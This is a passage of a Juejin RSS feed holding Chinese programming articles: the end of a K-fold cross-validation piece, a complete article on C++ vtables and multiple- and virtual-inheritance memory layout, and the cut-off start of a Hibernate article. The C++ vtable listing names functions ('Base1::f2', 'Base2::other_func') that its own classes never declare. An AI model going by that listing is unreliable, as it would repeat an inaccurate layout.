    score.append(cvresult.mean()) 
    var.append(cvresult.var())

plt.plot(krange,score,color=<span class="hljs-string">'k'</span>)
plt.plot(krange,np.array(score)+np.array(var)*<span class="hljs-number">2</span>,c=<span class="hljs-string">'red'</span>,linestyle=<span class="hljs-string">'--'</span>)
plt.plot(krange,np.array(score)-np.array(var)*<span class="hljs-number">2</span>,c=<span class="hljs-string">'red'</span>,linestyle=<span class="hljs-string">'--'</span>)
</code></pre>
<p>生成图片如下图所示：
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c6ae2c16948404f9d97475e158d26ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767534916&amp;x-signature=wtEW3ipBF8a9YABI%2BbYIIMDkbN0%3D" alt="折数图表绘制" loading="lazy"/></p>
<p>折数过大：</p>
<ul>
<li>运算效率变慢</li>
<li>预测率方差变大，难以保证在新的数据集达到预期预测率</li>
</ul>
<h2 data-id="heading-8">错误速查</h2>





















































<table><thead><tr><th>症状</th><th>根因</th><th>定位</th><th>修复</th></tr></thead><tbody><tr><td>每次跑分差异很大，曲线忽高忽低</td><td>单次随机划分导致评估方差大；数据量小/类别不均衡更明显</td><td>固定 random_state 对比；打印每次划分的类别占比</td><td>用 K 折交叉验证输出 mean/var；分类任务优先 StratifiedKFold/StratifiedShuffleSplit；必要时扩大数据量</td></tr><tr><td>交叉验证后在测试集反而更差</td><td>在验证折上“过度调参”；测试集划分本身偏</td><td>对比不同随机种子的测试集结果分布</td><td>严格三段式：train +（CV 调参）+ test；或用 nested CV；减少超参搜索空间</td></tr><tr><td>cv 设置很大（如 100）后分数大幅下降且波动增大</td><td>每折训练集过小，模型估计不稳；运算量暴涨</td><td>观察每折样本数：n_samples / cv；看 var 是否飙升</td><td>控制 cv（常用 5 或 10）；小数据用重复 K 折（RepeatedKFold）而不是极大 cv</td></tr><tr><td>报错：The least populated class in y has only 1 member</td><td>分层交叉验证下，某些类别样本太少，无法分折</td><td>查看 y 各类别计数</td><td>合并稀有类/补样本/降低 cv；或改用不分层但需承担分布漂移风险</td></tr><tr><td>CV 分数异常高，线上效果很差</td><td>数据泄漏：在 CV 之前做了全量标准化/特征选择/编码</td><td>检查预处理是否在 fit 前用到全量数据</td><td>用 Pipeline 把预处理放进 CV（StandardScaler/Encoder/SelectKBest 等都在折内 fit）</td></tr><tr><td>同一份代码在不同机器结果不一致</td><td>并行/随机性/浮点差异；未固定种子</td><td>检查 random_state、n_jobs、numpy 随机种子</td><td>固定 random_state；必要时 n_jobs=1 复现；记录依赖版本与硬件信息</td></tr><tr><td>指标看起来“稳定”但业务不达标</td><td>选错 scoring（accuracy 不适合不均衡）；只看均值不看业务约束</td><td>对比多指标：precision/recall/F1/AUC；看混淆矩阵</td><td>明确业务目标与阈值；设置 scoring；分类不均衡用 macro/weighted 指标并配合分层 CV</td></tr></tbody></table>
<h2 data-id="heading-9">其他系列</h2>
<h3 data-id="heading-10">🚀 AI篇持续更新中（长期更新）</h3>
<p><strong>AI炼丹日志-29 - 字节跳动 DeerFlow 深度研究框<em>斜体样式</em>架 私有部署 测试上手 架构研究</strong>，持续打造实用AI工具指南！
<strong>AI研究-132 Java 生态前沿 2025：Spring、Quarkus、GraalVM、CRaC 与云原生落地</strong></p>
<h3 data-id="heading-11">💻 Java篇持续更新中（长期更新）</h3>
<p><strong>Java-207 RabbitMQ Direct 交换器路由：RoutingKey 精确匹配、队列多绑定与日志分流实战</strong>
MyBatis 已完结，Spring 已完结，Nginx已完结，Tomcat已完结，分布式服务已完结，Dubbo已完结，MySQL已完结，MongoDB已完结，Neo4j已完结，FastDFS 已完结，OSS已完结，GuavaCache已完结，EVCache已完结，RabbitMQ正在更新... 深入浅出助你打牢基础！</p>
<h3 data-id="heading-12">📊 大数据板块已完成多项干货更新（300篇）：</h3>
<p>包括 Hadoop、Hive、Kafka、Flink、ClickHouse、Elasticsearch 等二十余项核心组件，覆盖离线+实时数仓全栈！
<strong>大数据-278 Spark MLib - 基础介绍 机器学习算法 梯度提升树 GBDT案例 详解</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[C++虚函数表与多重继承内存布局深度剖析]]></title>    <link>https://juejin.cn/post/7588388014504542250</link>    <guid>https://juejin.cn/post/7588388014504542250</guid>    <pubDate>2025-12-28T13:36:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588388014504542250" data-draft-id="7588191506607390726" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="C++虚函数表与多重继承内存布局深度剖析"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-28T13:36:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码事漫谈"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            C++虚函数表与多重继承内存布局深度剖析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码事漫谈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-28T13:36:43.000Z" title="Sun Dec 28 2025 13:36:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    14
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在C++面向对象编程中，虚函数是实现运行时多态的关键机制。单继承场景下的虚函数表(vtable)布局相对直观，但当涉及到多重继承时，情况就变得复杂起来。本文将深入探讨虚函数表的实现原理，并重点解析多重继承下的内存布局，帮助开发者更好地理解C++对象模型的底层机制。</p>
<h2 data-id="heading-0">第一部分：虚函数表基础</h2>
<h3 data-id="heading-1">1.1 什么是虚函数表</h3>
<p>虚函数表（vtable）是C++编译器为每个包含虚函数的类生成的静态数据表，存储着指向该类虚函数的指针。每个包含虚函数的对象实例在内存中都包含一个指向对应vtable的指针（vptr）。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">func1</span><span class="hljs-params">()</span> </span>{ cout &lt;&lt; <span class="hljs-string">"Base::func1"</span> &lt;&lt; endl; }
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">func2</span><span class="hljs-params">()</span> </span>{ cout &lt;&lt; <span class="hljs-string">"Base::func2"</span> &lt;&lt; endl; }
    <span class="hljs-type">int</span> data = <span class="hljs-number">10</span>;
};

<span class="hljs-comment">// 内存布局示意：</span>
<span class="hljs-comment">// 对象实例:</span>
<span class="hljs-comment">// [vptr] -&gt; 指向Base的vtable</span>
<span class="hljs-comment">// [data] -&gt; 10</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// Base的vtable:</span>
<span class="hljs-comment">// [0] -&gt; &amp;Base::func1</span>
<span class="hljs-comment">// [1] -&gt; &amp;Base::func2</span>
</code></pre>
<h3 data-id="heading-2">1.2 vptr的初始化时机</h3>
<p>vptr的初始化发生在构造函数执行期间：</p>
<ol>
<li>在进入构造函数体之前，vptr被设置为当前类的vtable</li>
<li>构造函数体执行</li>
<li>如果存在派生类，在派生类构造函数中vptr会被重新设置为派生类的vtable</li>
</ol>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Derived</span> : <span class="hljs-keyword">public</span> Base {
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">Derived</span>() {
        <span class="hljs-comment">// 此时vptr已经指向Derived的vtable</span>
    }
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">func1</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{ cout &lt;&lt; <span class="hljs-string">"Derived::func1"</span> &lt;&lt; endl; }
};
</code></pre>
<h2 data-id="heading-3">第二部分：多重继承下的内存布局</h2>
<h3 data-id="heading-4">2.1 基本的多重继承布局</h3>
<p>当类从多个基类继承时，对象内存中将包含多个子对象，每个子对象都有自己的vptr。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base1</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">f1</span><span class="hljs-params">()</span> </span>{}
    <span class="hljs-type">int</span> b1_data = <span class="hljs-number">1</span>;
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Base2</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">f2</span><span class="hljs-params">()</span> </span>{}
    <span class="hljs-type">int</span> b2_data = <span class="hljs-number">2</span>;
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Derived</span> : <span class="hljs-keyword">public</span> Base1, <span class="hljs-keyword">public</span> Base2 {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">f1</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{}
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">f2</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{}
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">f3</span><span class="hljs-params">()</span> </span>{}
    <span class="hljs-type">int</span> d_data = <span class="hljs-number">3</span>;
};

<span class="hljs-comment">// Derived对象内存布局（简化）:</span>
<span class="hljs-comment">// [vptr1] -&gt; 指向Derived中Base1部分的vtable</span>
<span class="hljs-comment">// [b1_data] -&gt; 1</span>
<span class="hljs-comment">// [vptr2] -&gt; 指向Derived中Base2部分的vtable  </span>
<span class="hljs-comment">// [b2_data] -&gt; 2</span>
<span class="hljs-comment">// [d_data] -&gt; 3</span>
</code></pre>
<h3 data-id="heading-5">2.2 this指针调整机制</h3>
<p>多重继承中最关键的问题是this指针调整。当通过Base2指针调用Derived对象的虚函数时，编译器需要调整this指针，使其指向Derived对象中的Base2子对象。</p>
<pre><code class="hljs language-cpp" lang="cpp">Derived* d = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Derived</span>();
Base2* b2 = d;  <span class="hljs-comment">// 这里发生隐式转换：b2指向Derived对象中的Base2子对象</span>

<span class="hljs-comment">// 转换过程相当于：</span>
<span class="hljs-comment">// Base2* b2 = reinterpret_cast&lt;Base2*&gt;(reinterpret_cast&lt;char*&gt;(d) + sizeof(Base1));</span>
</code></pre>
<h3 data-id="heading-6">2.3 多重继承的vtable结构</h3>
<p>每个基类在派生类中都有独立的vtable。派生类的新虚函数通常附加到第一个基类的vtable末尾。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// Derived对象的vtable结构：</span>

<span class="hljs-comment">// Base1子对象的vtable (主vtable):</span>
<span class="hljs-comment">// [0] -&gt; &amp;Derived::f1    // 重写Base1::f1</span>
<span class="hljs-comment">// [1] -&gt; &amp;Base1::f2      // 未重写，保持Base1版本</span>
<span class="hljs-comment">// [2] -&gt; &amp;Derived::f3    // 新增虚函数</span>

<span class="hljs-comment">// Base2子对象的vtable (次vtable):</span>
<span class="hljs-comment">// [0] -&gt; &amp;thunk_to_Derived::f2  // 需要this调整的跳转代码</span>
<span class="hljs-comment">// [1] -&gt; &amp;Base2::other_func     // 其他Base2虚函数</span>
</code></pre>
<h2 data-id="heading-7">第三部分：虚继承的内存布局</h2>
<h3 data-id="heading-8">3.1 菱形继承问题</h3>
<p>虚继承用于解决菱形继承（钻石继承）中的二义性和数据冗余问题。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span> </span>{}
    <span class="hljs-type">int</span> base_data = <span class="hljs-number">10</span>;
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Middle1</span> : <span class="hljs-keyword">virtual</span> <span class="hljs-keyword">public</span> Base {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">middle1_func</span><span class="hljs-params">()</span> </span>{}
    <span class="hljs-type">int</span> m1_data = <span class="hljs-number">20</span>;
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Middle2</span> : <span class="hljs-keyword">virtual</span> <span class="hljs-keyword">public</span> Base {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">middle2_func</span><span class="hljs-params">()</span> </span>{}
    <span class="hljs-type">int</span> m2_data = <span class="hljs-number">30</span>;
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Derived</span> : <span class="hljs-keyword">public</span> Middle1, <span class="hljs-keyword">public</span> Middle2 {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{}
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">derived_func</span><span class="hljs-params">()</span> </span>{}
    <span class="hljs-type">int</span> d_data = <span class="hljs-number">40</span>;
};
</code></pre>
<h3 data-id="heading-9">3.2 虚基类表（vbtable）</h3>
<p>虚继承引入了虚基类表（vbtable）或类似机制，用于定位虚基类子对象的位置。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// Derived对象内存布局（典型实现）:</span>
<span class="hljs-comment">// [vptr_Middle1] -&gt; Middle1的vtable (包含vbtable偏移)</span>
<span class="hljs-comment">// [m1_data] -&gt; 20</span>
<span class="hljs-comment">// [vptr_Middle2] -&gt; Middle2的vtable (包含vbtable偏移)</span>
<span class="hljs-comment">// [m2_data] -&gt; 30</span>
<span class="hljs-comment">// [d_data] -&gt; 40</span>
<span class="hljs-comment">// [vptr_Base] -&gt; Base的vtable</span>
<span class="hljs-comment">// [base_data] -&gt; 10</span>

<span class="hljs-comment">// 每个虚继承的基类都通过自己的vtable中的一个额外条目</span>
<span class="hljs-comment">// 来存储到虚基类子对象的偏移量</span>
</code></pre>
<h3 data-id="heading-10">3.3 虚继承下的性能考量</h3>
<p>虚继承增加了间接访问的开销：</p>
<ol>
<li>额外的指针解引用访问虚基类成员</li>
<li>虚函数调用可能需要多次间接寻址</li>
<li>对象构造和析构更复杂</li>
</ol>
<h2 data-id="heading-11">第四部分：实际案例分析</h2>
<h3 data-id="heading-12">4.1 查看内存布局的工具和方法</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 使用编译器特定功能查看内存布局</span>
<span class="hljs-comment">// GCC: -fdump-class-hierarchy 选项</span>
<span class="hljs-comment">// MSVC: /d1reportAllClassLayout 选项</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">Example</span>() = <span class="hljs-keyword">default</span>;
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;
};

<span class="hljs-comment">// 编译时添加选项查看布局</span>
<span class="hljs-comment">// g++ -fdump-class-hierarchy example.cpp</span>
</code></pre>
<h3 data-id="heading-13">4.2 性能优化建议</h3>
<ol>
<li><strong>避免深层次的多重继承</strong>：超过2-3层的多重继承会显著增加复杂度</li>
<li><strong>谨慎使用虚继承</strong>：只在真正需要解决菱形继承问题时使用</li>
<li><strong>考虑组合代替继承</strong>：许多情况下，组合模式更清晰高效</li>
<li><strong>注意缓存局部性</strong>：分散的vptr可能影响缓存性能</li>
</ol>
<h2 data-id="heading-14">第五部分：ABI兼容性与实践</h2>
<h3 data-id="heading-15">5.1 跨编译器兼容性</h3>
<p>不同编译器（GCC、Clang、MSVC）的vtable实现细节不同：</p>
<ul>
<li>vptr位置（对象开头或结尾）</li>
<li>虚基类指针的存储方式</li>
<li>RTTI信息的整合方式</li>
</ul>
<h3 data-id="heading-16">5.2 最佳实践</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 1. 明确使用override关键字</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Interface</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;
    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">Interface</span>() = <span class="hljs-keyword">default</span>;
};

<span class="hljs-comment">// 2. 优先使用接口类（纯虚类）进行多重继承</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Runnable</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;
    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">Runnable</span>() = <span class="hljs-keyword">default</span>;
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Worker</span> : <span class="hljs-keyword">public</span> Interface, <span class="hljs-keyword">public</span> Runnable {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{ <span class="hljs-comment">/* 实现 */</span> }
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{ <span class="hljs-comment">/* 实现 */</span> }
};

<span class="hljs-comment">// 3. 使用final优化性能（C++11）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">OptimizedDerived</span> <span class="hljs-keyword">final</span> : <span class="hljs-keyword">public</span> Base {
    <span class="hljs-comment">// 不能被进一步继承，某些情况下允许编译器优化</span>
};
</code></pre>
<h2 data-id="heading-17">结论</h2>
<p>理解C++虚函数表和多重继承的内存布局对于编写高效、可靠的C++代码至关重要。虽然现代C++更倾向于使用组合和基于接口的设计，但深入理解这些底层机制仍然是高级C++开发者的必备技能。通过掌握这些知识，开发者可以：</p>
<ol>
<li>更好地调试复杂继承层次的问题</li>
<li>做出更明智的架构设计决策</li>
<li>编写ABI兼容的库和接口</li>
<li>在性能关键场景中进行针对性优化</li>
</ol>
<p>C++的对象模型虽然复杂，但其设计的灵活性和性能优势正是通过这种复杂性实现的。作为开发者，我们应该在理解底层机制的基础上，合理运用语言特性，构建既高效又易于维护的系统。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（8）什么是Hibernate的SessionFactory？]]></title>    <link>https://juejin.cn/post/7588300640599080966</link>    <guid>https://juejin.cn/post/7588300640599080966</guid>    <pubDate>2025-12-27T23:15:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588300640599080966" data-draft-id="7588152122186989622" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（8）什么是Hibernate的SessionFactory？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-27T23:15:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（8）什么是Hibernate的SessionFactory？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-27T23:15:44.000Z" title="Sat Dec 27 2025 23:15:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body 